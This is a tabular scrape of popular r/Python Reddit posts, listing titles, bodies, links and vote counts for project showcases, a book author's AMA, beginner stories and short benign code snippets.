  [4.2 Math Functions](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-4-2-math-functions)  
  [4.3 `all()` and `any()`](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-4-3-all-and-any)  
  [4.4 `concatenate()`](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-4-4-concatenate)  
  [4.5 Stacking](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-4-5-stacking)  
  [4.6 Sorting](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-4-6-sorting)  
  [4.7 `unique()`](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-4-7-unique)  
  [4.8 Challenge: Movie Ratings](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-4-8-challenge-movie-ratings)  
  [4.9 Challenge: Big Fish](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-4-9-challenge-big-fish)  
  [4.10 Challenge: Taco Truck](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-4-10-challenge-taco-truck)  
5. **Advanced Array Stuff**  
  [5.1 Advanced Array Indexing](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-5-1-advanced-array-indexing)  
  [5.2 View vs Copy](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-5-2-view-vs-copy)  
  [5.3 Challenge: Population Verification](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-5-3-challenge-population-verification)  
  [5.4 Challenge: Prime Locations](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-5-4-challenge-prime-locations)  
  [5.5 Challenge: The Game of Doors](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-5-5-challenge-the-game-of-doors)  
  [5.6 Challenge: Peanut Butter](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-5-6-challenge-peanut-butter)  
6. **Final Boss**  
  [6.1 `as_strided()`](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-6-1-as_strided)  
  [6.2 `einsum()`](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-6-2-einsum)  
  [6.3 Challenge: One-Hot-Encoding](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-6-3-challenge-one-hot-encoding)  
  [6.4 Challenge: Cumulative Rainfall](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-6-4-challenge-cumulative-rainfall)  
  [6.5 Challenge: Table Tennis](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-6-5-challenge-table-tennis)  
  [6.6 Challenge: Where's Waldo](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-6-6-challenge-wheres-waldo)  
  [6.7 Challenge: Outer Product](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-6-7-challenge-outer-product)  

If you find this useful, please consider liking my videos and subscribing to my [YouTube channel](https://www.youtube.com/channel/UCOcsois3fuvgFRZGdozQHeg).

Also, stay posted for my next course, Python Pandas For Your Grandpa.

**UPDATE** since this post blew up.  

1.  After >1 year of having a YouTube channel, I had 59 subscribers. I posted this 16 hours ago and now I have 325 subscribers and counting. Two people even *purchased* my course. Like, what!?!? Thank you!  
2.  *Please* stay posted for my next course Python Pandas For Your Grandpa. It's nearly finished after months of work, and the production quality is much better.

**UPDATE 2**  
My [course on Pandas](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa/) has been released!  ([View on YouTube](https://www.youtube.com/playlist?list=PL9oKUrtC4VP7ry0um1QOUUfJBXKnkf-dA))",https://www.reddit.com/r/Python/comments/l1jdcj/i_made_a_course_on_numpy_it_got_good_reviews_but/,134,2518
otbvoj,"Hello, world! I'm Al Sweigart, author of ""Automate the Boring Stuff with Python"" and several other programming books. AMA!","Howdy, y'all. I'm Al Sweigart (rhymes with ""why dirt""), author of ""Automate the Boring Stuff with Python"" and several other programming books. I release all of my books under a Creative Commons license, so you can read them for free on my website at https://inventwithpython.com

My latest books are [The Big Book of Small Python Projects](https://inventwithpython.com/bigbookpython/) and [Beyond the Basic Stuff with Python](https://inventwithpython.com/beyond/). I'm currently working on a book about recursion (the recursion jokes get funnier every time I hear them) which should be available in 2022. The ideas for this book grew into [a 2018 North Bay Python talk I gave](https://www.youtube.com/watch?v=AfBqVVKg4GE).

""Big Book"" contains the source code for 81 games, puzzles, simulations, and animations that were designed to be short and simple to understand. Folks tend to get caught up in repeating yet another ""hello world"" tutorial, but don't quite know how to apply the programming concepts they learned into actual programs. This book is full of source code that they can study to see how real-world programs work. They aren't just code snippets but actual, runnable programs. If you've been told you should ""work on your projects"" but don't know where to start, or if you've been told ""look at the source code of open source projects"" but found them undocumented and inscrutable, check out these programs.

""Beyond the Basic Stuff"" is a sort of follow up to ""Automate the Boring Stuff"" (or any other beginner Python resource). It goes into how professionals write code and best practices they follow. There's information on how to find help on your own, how to format your code and name your variables, an explanation of common programming jargon, the basics of Git, three chapters on object-oriented programming (and more importantly, when and why to use OOP), and more.

You've probably seen [my posts at the start of the month](https://www.reddit.com/r/Python/comments/obq0cg/automate_the_boring_stuff_with_python_online/) when I make my online Python course free. About 15,000 to 30,000 people sign up each month, though according to my stats only about 5% of people actually complete the course (which is typical for online courses, free or paid).

I got started writing programming books in 2009 when my then-girlfriend was a nanny for kid who wanted to learn to program. I started writing a book (which would become Invent Your Own Computer Games with Python) and self-published. People liked it, so I kept writing, and Automate was my first book through a traditional publisher, No Starch Press. I quit my software developer job in 2013 to finish writing Automate, thinking I'd get another software dev job in a year. But I kept having more ideas for other books, tutorials, videos, etc. so I'm still here writing.

Ask me anything! Post your questions and upvote questions you find interesting, and at 2pm central I'll begin replying.

EDIT (4:30pm Central) Wow, I've been typing nonstop for two and a half hours. I'm going to take a quick break and then keep going. Thanks for the questions, everyone!

EDIT 2: Oh yeah, I forgot to mention I'm also creating a 56-video Udemy course for the Beyond the Basic Stuff with Python book as well. [So far I only have the first 15 videos done, but you can watch them on YouTube.](https://www.youtube.com/watch?v=kSrnLbioN6w&list=PL0-84-yl1fUmeV_2bBSguF_S0TVZk8wow)

EDIT (7:00pm) Heh, wow another two hours flew by. I'm going to drive home and then maybe answer a few more. Thanks again, everyone!

EDIT (10:30pm) Calling it a night. I'll probably answer a few more tomorrow, but I have to get back to work. Thanks again, everyone! Oh, and if you can help me out, writing an (honest) Amazon review for my books (especially the latest two) or even just sharing the links to the free online copies would be really help me get them in front of more people.",https://www.reddit.com/r/Python/comments/otbvoj/hello_world_im_al_sweigart_author_of_automate_the/,533,2493
go6no5,"Spotlightify - a overlay controller for spotify, allowing you to quickly control your music without distraction. Please let me know if you are interested in this application as I am thinking of making it public on my github in the near future (once more features have been developed), thanks!",,https://v.redd.it/qy9hkp9307051,210,2494
ejnnbc,I wrote a python script that I'm running on my phone to play a word game called Ruzzle.,,https://v.redd.it/q8yf2bhacn841,230,2488
hl2ho5,"Started learning python today, Screw 'Hello World' , I'll start with 'Hello There'",,https://i.redd.it/wxx1gcbs2u851.png,185,2484
8fztrr,xkcd: Python Environment,,https://imgs.xkcd.com/comics/python_environment.png,391,2443
es8dai,"Work laptop doesn't allow minesweeper? I'm gonna build my own minesweeper, with blackjack, and hookers! In fact, forget the hookers!",,https://v.redd.it/43d389uv2ac41,115,2416
l8jvev,"I created a video about Neural Networks that is specifically aimed at Python developers! If you understand the Code, you understand how to create a Neural Network from Scratch! The video took me 200h to create and is fully animated! Hope it helps you guys :)",,https://youtube.com/watch?v=9RN2Wr8xvro&feature=share,62,2403
hei6kg,Wrote a script that downloads r/wallpaper's hottest 100 images and cycles through them as a wallpaper!,,https://v.redd.it/pxn50vuyvo651,141,2387
l4kpou,"My startup failed, so I open sourced the code. I hope someone finds it useful.",,https://github.com/AdamGold/Dryvo,119,2378
lo6ws0,"Happy birthday, Python, you're 30 years old today: Easy to learn, and the right tool at the right time",,https://www.theregister.com/2021/02/20/happy_birthday_python_youre_30/,89,2372
fgdbxb,I made a Sudoku.com solver using Selenium,,https://v.redd.it/xxgz2t9ldul41,64,2373
f2jda1,NSA just declassified their python training documents,"[https://nsa.sfo2.digitaloceanspaces.com/comp3321.pdf](https://nsa.sfo2.digitaloceanspaces.com/comp3321.pdf)

&#x200B;

One of the best all-in-one resources I've ever found. It starts from basics and goes all the way up to an advanced level. I would check this out, even if you're not a beginner.",https://www.reddit.com/r/Python/comments/f2jda1/nsa_just_declassified_their_python_training/,187,2359
zdpoi4,"at 44, I am struggling on Python for two months now but I keep at it. 2 hours a night, after the kids sleep, I work on it and will eventually be able to use it to get a better job, a better life for them.","you got to accept to be bad at something to be good at it, right? 

Right? OK, I'll confess... I am posting here anonymously to ...IDK... find support, I guess. .. I can't give up.. for my kids, I need to succeed.

I've done this and I am a bit proud. Very small step for you but for me, it is a big step.

**def** blackjackbis(n1:int, n2:int, n3:int) -> int:  
 if sum((n1,n2,n3)) <= 21:  
 return sum((n1,n2,n3))  
 elif sum((n1,n2,n3))-10 <= 21 and 11 in (n1,n2,n3):  
 return sum((n1,n2,n3)) - 10  
 else:  
 return ""Bust""

thanks",https://www.reddit.com/r/Python/comments/zdpoi4/at_44_i_am_struggling_on_python_for_two_months/,293,2347
ja5y2m,Made this tool with python and my son now hates me,"I use it to generate endless random basic math questions for him to practice =)

[https://github.com/januschung/math-worksheet-generator](https://github.com/januschung/math-worksheet-generator)",https://www.reddit.com/r/Python/comments/ja5y2m/made_this_tool_with_python_and_my_son_now_hates_me/,195,2338
gmgezg,"After having this idea a while back and seeing yesterday's post with arduino controlled auto ambient lighting, I creating my own version with python!",,https://v.redd.it/m0nqwy6q0nz41,117,2333
ebjgvl,I wrote a program that doodles things in MS Paint!,,https://v.redd.it/xiunmzu8jv441,125,2323
koat5n,"Spent 9hrs finding a bug yesterday, took 15mins to figure it out today","I spent the whole day finding a bug yesterday, couldn't find it at the end of the day and got a headache due to stress. Woke up today and found the bug 15 mins after.

Worrying about the delay in the project fogged my mind and I couldn't think logically, blind to different possibilities.

Taking a break and having a clear mind is very important. This has happened to me a couple of times so decided to post this here today to remember not to repeat this ever lol.


Edit: Thanks for the award kind stranger. I thought this was more of a personal problem, reading all the comments I'm happy to know I'm not alone. I feel more normal now 🙂.",https://www.reddit.com/r/Python/comments/koat5n/spent_9hrs_finding_a_bug_yesterday_took_15mins_to/,176,2315
dhs74f,When Python Meets Fourier Transform,,https://v.redd.it/glertp8ryis31,125,2316
npkm6o,It takes a village to build an open-source project and a single a**hole to demotivate everyone,"I am a contributor to Open-Source software([Jina](https://github.com/jina-ai/jina) \- an AI search framework) and I am annoyed with how some people make fun of the sheer hard work of open-source developers.

For the last 1 yr, we had made our contributors team meetings public(everyone could listen and participate during the meeting). And this is what happened in our last meeting - **While we were sharing news about upcoming Jina 2.0 release in the zoom meeting, some loud racist music starts playing automatically and someone starts drawing a d\*ck on the screen.**

Warning: This video is not suitable to watch for kids or at work

[Video clip from the meeting - someone zoombombed at 00:25](https://reddit.com/link/npkm6o/video/8a16kolvlk271/player)

It was demotivating to say the least.

Building open-source project is challenging at multiple fronts other than the core technical challenges

* Understand what needs to be built
* Improve that continuously
* Help people understand the project
* Educate people about the domain
* Reach out people who might benefit from your project
* Collaborate with other contributors
* Deal with issues/PRs
* Deal with outdated versions/docs
* **Deal with different opinions**
* Sometimes deal with jerks like the ones who zoombombed us

The list is long! Open-source is hard!

Open-source exists because of some good people out there like you/me who care about the open-source so deeply to invest their time and energy for a little good for everyone else. It exists because of communities like r/python where we can find the support and the motivation. e.g. via this community, I came to know of many use cases of my project, problems and solutions in my project, and even people who supported me build it.

I wanted to vent out my negative experiences and wanted to say a big \*\*Thank you\*\* to you all open-source people, thanks to many(1.6k) contributors who made it possible for us to release \[Jina 2.0\]([https://github.com/jina-ai/jina/](https://github.com/jina-ai/jina/)) 🤗.

I'd want to know your opinion, how do you deal with such unexpected events and how do you keep yourself motivated as an open-source developer?",https://www.reddit.com/r/Python/comments/npkm6o/it_takes_a_village_to_build_an_opensource_project/,191,2302
b3oyhl,Made something similar to Apple's Animoji™ using Python,,https://v.redd.it/gmp27nnr9gn21,70,2276
f8bn5w,I made a recursive maze solver in Python,,https://v.redd.it/72hqdut09pi41,116,2275
jtdi2e,Python swallows Java to become second-most popular programming language,,https://www.theregister.com/2020/11/12/python_swallows_java_to_become/,211,2266
714kww,Every article about python decorators be like...,,https://i.redd.it/etmqp95akvmz.jpg,121,2257
g10v5z,I made a python script to download subtitles for your movies...,,https://i.redd.it/kj5vvd1weqs41.gif,221,2250
exiubj,I'll be damned,,https://i.redd.it/5kfs3x27tfe41.png,106,2248
dvw09b,"BrachioGraph, an ultra-cheap Python-powered drawing machine",,https://v.redd.it/w4f0q6tbzhy31,56,2241
lcexoa,I made a Finance Database with over 180.000 tickers to make Investment Decisions easier,"In my spare time I like to go through financial data to understand what kind of companies exist, how sectors and industries evolve and to test theoretical frameworks. However, I found that it required a lot of effort to figure out which companies belong to which industry and I often ran into paywalls that blocked me from accessing the exact data I was looking for. Platforms like Bloomberg offer such services but at ridiculous prices (up to $24.000 a year). This can make investment decisions for the retail investor rather difficult especially if you don't want to follow 'the herd'. **I wanted to change that.**

**Insert the** [**FinanceDatabase**](https://github.com/JerBouma/FinanceDatabase)**.** A database of over 180.000 symbols (80k+ companies, 15k+ ETFs, 30k+ Funds, 3k+ Cryptocurrencies and more) that is fully categorised per country, industry, sector, category and more. It features a 'Searcher' package (***pip install FinanceDatabase***) that has a user-friendly way of collecting the exact data you want (downloaded straight from the repository). For example, the following code returns all (listed) airlines in the United States (check [Examples](https://github.com/JerBouma/FinanceDatabase#Examples) for more info) :

    import FinanceDatabase as fd
    
    airlines_us = fd.select_equities(country='United States', industry='Airlines')

And the following gives insights in ETFs that have anything to do with 'semiconductor':

    import FinanceDatabase as fd
    
    all_etfs = fd.select_etfs()
    semiconductor_etfs = fd.search_products(all_etfs, 'semiconductor')

What I explicitly am *not* trying to do is re-invent the wheel (again) of Fundamental Data gathering as there are tons of packages out there that do that already (i.e. [FundamentalAnalysis](https://github.com/JerBouma/FundamentalAnalysis), [yfinance](https://github.com/ranaroussi/yfinance), [sec-edgar](https://github.com/sec-edgar/sec-edgar)) but instead allow you to capture sector, industries, specific types of ETFs or cryptocurrencies that would have otherwise resulted in a lot of manual work. Then, when you have this sub-selection you can make use of the earlier mentioned packages.

**If you want to know what is available inside the Database, please have a look** [here](https://github.com/JerBouma/FinanceDatabase/tree/master/Database)**.** Alternatively, you can do the following (an example):

    import FinanceDatabase as fd
    
    equities_countries = fd.show_options('equities','countries') # or sector/industry
    etfs_categories = fd.show_options('etfs')
    cryptocurrencies = fd.show_options('cryptocurrencies')

I hope this can help some of you out making (better) investment decisions and all feedback (positive and negative) and contribution is much appreciated.

EDIT: Thanks for the rewards and kind words everyone!",https://www.reddit.com/r/Python/comments/lcexoa/i_made_a_finance_database_with_over_180000/,111,2240
gpqquf,I launched my new website with all my free Python and Machine Learning Tutorials (currently 68).,,https://www.python-engineer.com/,115,2244
fofxnx,I made my handwriting a font on Inkscape and used custom made python script to add random movment (in y axis) for each character. Looks fine or too suspicious?,,https://i.redd.it/qm83ej0yipo41.jpg,203,2236
g78ih1,I wrote a program on python to show how the number of swearwords differs across each breaking bad episode to see if there was any kind of correlation - turns out there isn't and this was a complete flop,,https://i.redd.it/sx843xk7qru41.png,304,2221
e1ldoz,"A fitting curve that ""boings"" into place (and a digression into spring-mass-dampers, vibration and control theory, and integral transforms)",,https://i.redd.it/tp80yhyrwv041.gif,56,2214
mca9u2,Python made me look like a WIZARD,"Today in work a request comes in for 745 headshots that need to be processed to fit 150x150px for an external platform. One team says it'll take them at least a week to do, the other team says they don't want it as it'll take even longer.

""They need them all black and white! It'll take some time to convert them! They're not even all the same size! UGH this just can't be done in the 2 days they've requested this!!!""

12 lines of code, the Pillow library and exactly 8.856 seconds of running said code... It was done. Panic over. Client happy.

I work in a design team but I'm a job coordinator (so I sort the jobs and make sure the right designers get them). They were amazed it was done so quickly without using Photoshop.

They asked how. I gave them the answer.

Python baby 😎

EDIT

For those wanting to know the code, here it is:

    from PIL import Image
    import os
    
    for f in os.listdir('Input'):
        if f.endswith('.jpg'):
            im = Image.new('RGB', (150, 150), (255,255,255))
            im2 = Image.open('Input/{}'.format(f))
            im2 = im2.convert(""L"")
            width, height = im2.size
            im.paste(im2, (int((150 - width) / 2), 0))
            fn, fext = os.path.splitext(f)
            im.save('Output/{}.jpg'.format(fn))

The images given were either 150x150 already (but in colour) or 120x150. So had to cover all bases with this. If it could be made more efficient, let me know!",https://www.reddit.com/r/Python/comments/mca9u2/python_made_me_look_like_a_wizard/,291,2205
dbg4nm,Rolling Shutter Effect demonstrated with Python,,https://v.redd.it/fu4wiipo0sp31,60,2206
htkddu,My first major Python project! Made with 100% python using pygame. Source code and download in comments.,,https://v.redd.it/x6thsow5hnb51,128,2195
bsy603,My gravity simulation almost an entire day of work later! Featuring inelastic collisions,,https://i.redd.it/2u3z0tlnne031.gif,149,2182
jogwc5,Stack overflow traffic to questions about selected python packages,,https://i.redd.it/qnfy9xe0lex51.jpg,145,2169
gq8254,"I created ""twenny"" – my very first app! It reminds you to give your eyes a break every 20 minutes to prevent eye strain and is located in your menubar. You can download it on GitHub!",,https://i.redd.it/lw9qnqd4sv051.png,163,2167
fpvay3,Boids - organic motion from 3 simple rules,,https://v.redd.it/n38kfl4q97p41,147,2161
hd6l9t,A VS Code extension that displays the values of variables while you type,,https://i.redd.it/w432uk9rh9651.gif,114,2146
kqbo85,A new kind of Progress Bar for Python,"# A new kind of Progress Bar for Python, with some very cool animations!

I've made a new kind of progress bar for python! With some very cool animations and a smorgasbord of built-in styles!

[https://github.com/rsalmei/alive-progress](https://github.com/rsalmei/alive-progress)

[alive-progress overview](https://i.redd.it/0e66l0xy8c961.gif)

&#x200B;

The spinners and unknown bars have a plethora of effects!

[alive-progress styles](https://i.redd.it/viqlvrka9c961.gif)

&#x200B;

The bars themselves also have several styles.

[alive-progress bars](https://i.redd.it/57y6z5sn9c961.gif)

&#x200B;

It also includes cool zero-hassle print and logging hooks, which are always enabled!

[alive-progress print hook](https://i.redd.it/09ort3su9c961.gif)

&#x200B;

To use it, just ""pip install alive-progress"" and you're good to go!  
More details in [https://github.com/rsalmei/alive-progress](https://github.com/rsalmei/alive-progress)

That's it, hope you like it!",https://www.reddit.com/r/Python/comments/kqbo85/a_new_kind_of_progress_bar_for_python/,154,2142
rra22x,Ever heard of Black? This is the opposite. A tool to turn your clean python code into a hideous (working) mess.,"You can find the tool here: [https://github.com/LeviBorodenko/lancer](https://github.com/LeviBorodenko/lancer) (Use with caution!)

# Features

1. Turn all comments into Pitbull lyrics 💃
2. Turn all your variable names into a mixture of animal sounds and horribly similar looking characters like ""bark\_bark\_0OO0O"". 🐶
3. Add irritating white spaces.
4. Code still compiles after all these \_improvements\_! 👷

# Example

Before:

    
    # function that adds two numbers
    def addition(a: int, b: int) -> int:
    
        # find sum
        result = a + b
    
        # return the sum
        return result
    
    
    if __name__ == '__main__':
        print(""Sum of 1 and 3 is %s"" % addition(1, 3))
    

After:

    # there's nothing like Miami's heat
    def quack_Il1Ι1l(squeak_squeak_IIΙΙlI: int, honk_honk_honk_aaαaα: int) -> int:
    
        # Bada bing, bada boom
        growl_growl_growl_ααaaα= squeak_squeak_IIΙΙlI  + honk_honk_honk_aaαaα
    
        # Hey baby, givin' it your all when you're dancin' on me
        return growl_growl_growl_ααaaα
    
    
    if __name__ == '__main__':
        print(""Sum of 1 and 3 is %s"" % quack_Il1Ι1l(1, 3))",https://www.reddit.com/r/Python/comments/rra22x/ever_heard_of_black_this_is_the_opposite_a_tool/,181,2141
priqp7,Any love for Python 2.5 on an i486?,,https://imgur.com/MT7wv1R,140,2134
kv0u3w,Programming + Math + Graphs = Art,,https://i.redd.it/c8z3mrmbuoa61.jpg,173,2135
8m9ei8,And so it begins... I’ve decided to start a new hobby and hopefully I can make some use out of it. Wish me luck!,,https://i.redd.it/ownnmsh8k6011.jpg,196,2136
c0xcn6,Probably the most useless thing that I have ever coded but it’s fun looking at it,,https://v.redd.it/iait59v7wi431,118,2131
empp5x,[OC] Updated version of my recent maze finding algorithm with source code,,https://v.redd.it/585jcli1qx941,111,2110
g1xlte,I found what happens when you change the Mandelbrot Set's power value and animated it with Python,,https://i.redd.it/u2r68zcwx0t41.gif,69,2096
haq3vc,Made a small Reddit client that runs on a 0.96 inch OLED display with a Raspberry Pi as my first project written in Python,,https://v.redd.it/k4mnainoqg551,69,2088
jus4vq,From Depressed Addict to Happy 25 Year old Making 65k/year - How learning Python helped save my life,"Hello all,

&#x200B;

&#x200B;

&#x200B;

&#x200B;

I am new to reddit, and after reading some posts of people expressing their frustration learning Python, I thought I would write about my own story on how learning Python helped save my life, and perhaps more importantly, gave my life meaning. I will try to be as brief as I can in my back story to keep this as relevant to Python as possible, but I feel it would be a disservice to leave it out completely, as my issues with mental health were a primary driver of the motivation I took advantage of to learn Python. I will post a more detailed description of my backstory later in r/addiciton or r/depression_help or something similar. Feel free to skip to the second \*\*\* to go straight to when I started learning python, however I suggest you read the whole post because honestly my whole story is relevant. If I hadn't gone through what I went through, I doubt I would have had the motivation to self-teach myself Python. 

&#x200B;

&#x200B;

&#x200B;

&#x200B;

\*\*\* 

&#x200B;

&#x200B;

&#x200B;

&#x200B;

I grew up in a wealthy, extremely homogenous town within an hour of New York City. I went to a public school, but if you saw the way people dressed, it looked more like a private prep school. The vast majority of the kids in my school had parents who were millionaires. My parents were not. I was an only child, and I grew up in a small apartment on the ""poor"" side of town (""poor"" meaning houses/ apartments went for < 750k). As you can imagine, the social structure of the school was entirely based off the wealth of your parents. So the game was rigged against me from the beginning. I had very few friends at a young age, and most people in my middle school probably would have described me as a ""loser"" or another synonymous term. I was very unhappy and became addicted to video games as a mean to escape my life. During high school, I finally started branching out to meet people from the surrounding towns, who were not nearly as pretentious as the people I grew up with. I made a lot of friends and started to have a legitimate social life. However, with this new social life came a lot of superficiality and drinking/drug using. 

Until my senior year of high school, my grades were mediocre at best. Because I hated my social life at school, I hated school in general. But in my senior year, something changed. I won't detail it in this post, but will certainly get into it more in my next post in r/addiction or r/depression_help . I improved my grades and went to community college for my first year. I ended that year with a 3.9 GPA and an acceptance to one of the best colleges in my state. I transferred to that college and thought my life from there on out would be perfect. I was wrong.

I hated the social scene of my college. I found it to be very superficial and revolved almost entirely around drinking. Later I realized that while this was true for the people I was surrounding myself with, nobody forced me to surround myself with those people. I did it because I thought that this was the only way to enjoy college, and if I didn't, I would be missing out on the experience of my life. Man, what a load of BS I let myself believe. This expectation set me up for failure, and I blamed myself entirely. I thought I was worthless, a loser, and that all the mean things people said about me in my hometown back in middle school were true. I fell into a deep depression and eventually dropped out. 

Towards the end of my time away at this state school, I saw a psychiatrist who prescribed me Adderall and Xanax to treat my depression and learning disabilities. In the beginning, they worked wonders, but they certainly didn't solve the underlying issues, they actually made them worse. After I dropped out, I began to rely on them completely. Before long, I was blacking out all the time as a result of the Xanax, and up for days at a time as a result of the Adderall. It was always one or the other, and I had to use the other to counter the negative effects of one. 

For the next few years, I battled with addiction and depression to the point where I felt hopeless. I would get a week or two or three sober, then relapse. Somehow I managed to go back to a local college during this time, but my grades were mediocre, because I would miss a week of school every time I would relapse. Eventually I went away to rehab for four months. This is where I started to learn Python. I was very fortunate to have parents who loved me enough to spend the money to send me to a place for four months. I know not everyone has this privilege, and it is my goal to pay my parents back the money they spent on me.

&#x200B;

&#x200B;

&#x200B;

&#x200B;

\*\*\*

&#x200B;

&#x200B;

&#x200B;

&#x200B;

The rehab I went to was basically in the middle of nowhere, and while I was inpatient the first month, the last three months I was in what was essentially a nicer version of a sober house. I worked part- time at a restaurant (\~20 hours a week). I had computer access, and I found myself very bored during the first week or two, so I decided to learn something I had always wanted to learn: Programming. I bought a few courses off [udemy.com](https://udemy.com) for \~$12/each (NEVER pay full price of a Udemy course. You can always get them discounted), and started learning. Pretty much anytime I wasn't working or going to AA meetings, I was programming. I essentially replaced my addiction to drugs with an addiction to learning. I really enjoyed it, but in hindsight, I overdid it, as any addict does. I came home after four months, and I fell back into old patterns, and relapsed just before I would have been 6 months sober. I will go into more detail about this in my posts in r/addiction / r/depression_help .

During my time in rehab, I completed 3 Udemy courses on Python, but honestly I only really learned the fundamentals. I've never been a very quick learner, as I have a processing disorder (I was always the last one to finish tests in school and it always took me longer to do assignments etc). I frequently got frustrated, and rarely took breaks. I would spend 4-8 hours a day practicing coding, but much of that time was obsessing over one thing that I couldn't figure out. This was a big part of why I burnt myself out. Later, I found that if I ran into a problem I couldn't figure out, and forced myself to take a break, 95% of the time I would figure it out within 10 minutes of coming back from a 15-20 minute break. The mind is funny like that. 

Fast forward about 6 months and I was back in rehab, this time for only 30 days. I came home and luckily got an internship at a very small investment firm, where they used python to trade stocks algorithmically. There, I had a boss who was a very good programmer, and he gave me real projects to do that required me to think critically. He rarely gave me any help. Most of the time when I asked a question he would say ""I know the answer, but you have to figure it out. It's the only way you'll learn"". This frustrated me at the time, but looking back it was probably one of the best things anyone ever did for me. I developed resourcefulness and patience, two incredibly imperative skills for any programmer who wants to be worth his/her salt. During this time, I was taking a few classes at a local college to finally finish my degree, and I was working anywhere from 15-40 hours a week at this investment firm, unpaid. I honestly worked a bit too hard, I almost burnt myself out again, but I managed to get through it. I was very lucky in that my parents helped me financially during this time, which allowed me to focus more on school and work. I had a few relapses during this period, but they were short and mild, so it didn't throw me off track too badly. 

Over this past summer I finished up my degree (I majored in Business) and started looking for jobs. I was sure to put as much of my accomplishments at the small investment firm that involved python on my resume as I could. Covid was (and is) still wreaking havoc on the economy, so I worked extra hard applying to jobs, making connections, and keeping my skills sharp. I honestly probably applied to over 2500 jobs. I only got maybe 3-4 interviews. I had one during the end of the summer that went to the final round, and I was sure I was going to get the job. I didn't. Instead, the company (according to a connection I had made within the company cold-emailing people) decided to hire people from India to save money. I definitely felt pretty hopeless at that point. But I didn't give up. Maybe a month later, I got an interview for a job at a major company as a Data Analyst. I had three rounds of interviews plus I had to send them examples of some of my Python projects. I didn't get my hopes up like I did last time, out of fear of being disappointed. To my surprise, I got the job. I had asked for a 50k salary. They gave me 60k base plus a 5k bonus contingent on my performance, plus great benefits. 

I've been at this job for a little over a month, and I honestly love it. I find myself excited to go to work every day, and the people really like me because I am able to provide real value to the company. In my first month, I worked a lot on automation of otherwise very manual tasks (usually involving excel or emails). I would ask people how many hours per week they would generally spend on such a task and wrote it down. I recently did the math and realized that I have so far saved the company over 750 hours of work per year, and that’s a conservative estimate using a 48 week year (to account for holidays, vacation etc.) and the low end of their estimated range of hours per week. This frees the employees up to work on more value added (and frankly much more interesting) projects. My work there is just beginning, and there are a ton of projects I am really excited about. 

&#x200B;

&#x200B;

&#x200B;

&#x200B;

\### (Please go to the next ### if you have no interest in hearing anything non-Python related)

I can honestly say I am happy now. I have over 4 months sober, and I rarely have any cravings to use drugs anymore. I really think this is largely because I found purpose in my life. That said, I still attend AA meetings often because I know I have to keep my sobriety my first priority. Without it, I have nothing. I also know that life isn't going to be perfect every day. While I do consider myself happy today, I still have bad days. Such is life. I stopped expecting to feel good all the time. Life is not designed that way. Before, I was only ""happy"" if I had a substance in my system. Also, ""happy"" to me was a euphoric rush which felt good, but was never fulfilling. Now I define happiness differently. It doesn't mean I feel good all the time. It means that despite sometimes not feeling good, I can appreciate how lucky I am to be alive and how blessed I am to have been given a second chance. Getting out of the rut that I found myself in a few years ago was the hardest thing I have ever done, but it was 100% worth it. At the risk of sounding corny, I really do believe sometimes you have to fall down hard and struggle getting back up to appreciate your life. 

\###

&#x200B;

&#x200B;

&#x200B;

&#x200B;

Learning Python was part of my journey, and it wasn't easy at all. When I started, I had a lot of doubts that I could do it. I didn't think ""people like me"" would be successful at something like this. Again, I was wrong. While I am certainly not even close to an expert at Programming/Python, I am good enough to be hired at a large company and good enough to make a difference. I'm sure there are people on Reddit and elsewhere that could make me look like I started programming last week. But I try not to compare myself to others. I instead try to compare myself to who I was before, and who I want to be in the future. As I’ve said several times before, I will make another post with more details about my experience with addiction/depression and give my general tips for life there, but for now here are my general tips for learning Python:

&#x200B;

&#x200B;

&#x200B;

&#x200B;

1. I suggest starting with the fundamentals. I used Jose Portilla's Udemy course for this and it was great. I will link it at the bottom along with some other resources.

2. If you struggle motivating yourself to follow online courses, try figuring out a real project to do that can actually help you in everyday life. This could be automating something you do in your job, for school, or just something you think will be fun. 

3. Work Hard. Don't give up. But don't burn yourself out. Take frequent breaks, especially when you get frustrated. 

4. Ask for help. If you’re struggling with a specific problem, r/learnpython is great, along with [Stackoverflow.com](https://Stackoverflow.com) . People have helped me with many problems there.

5. Trust the Process. Programming is a lot like learning an instrument in my opinion. At first it can be grueling and you won’t be able to do much for a while, but after you learn the fundamentals, it becomes incredibly enjoyable. 

6. Be consistent. This is extremely important. Try to set aside a time every day to practice. Even if it’s only 20-30 minutes. 

&#x200B;

&#x200B;

&#x200B;

&#x200B;

There are many more tips that I have but those are the most important ones I can think of. Please feel free to follow me as I hope to be quite active on reddit in the future. If you have any questions, please message me. Whether it's about Python, Addiction, Depression, or whatever else. I'll do my best to answer everyone I can. 

&#x200B;

&#x200B;

&#x200B;

&#x200B;

Thanks.",https://www.reddit.com/r/Python/comments/jus4vq/from_depressed_addict_to_happy_25_year_old_making/,109,2083
gu9nzq,"I configured my terminal to teach me a new word everyday! Every time I open a new terminal window, I have a python script that scrapes dictionary.com and gives me the word of the day. On top of that, I have a motivational quote displayed as well :)",,https://i.redd.it/xutjmkkss6251.png,167,2086
faf0zd,I've created a python program that generates photomosaics from any dataset !,,https://i.redd.it/32qlya6gyhj41.png,61,2084
a7dcnk,Python Virtual Environments: Extreme Advertising Edition,,https://i.redd.it/f60emy6qq2521.jpg,289,2078
eluz97,Visualizing Bubble Sort,,https://i.redd.it/r1rr66rzzk941.png,75,2074
